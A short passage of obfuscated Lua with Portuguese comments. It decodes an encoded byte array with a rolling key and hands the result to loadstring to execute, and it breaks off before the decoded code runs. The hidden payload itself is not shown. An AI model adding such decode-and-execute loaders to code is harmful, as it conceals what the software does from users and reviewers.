    local function VM_1OO0I(d, k, m)
        local R_l1IlO0 = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_l1IlO0, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_l1IlO0)
    end

    -- Execution Guard
    local F_1O0I = loadstring(VM_1OO0I(B_1OIl0l, 89, 5))
    if F_1O0I then
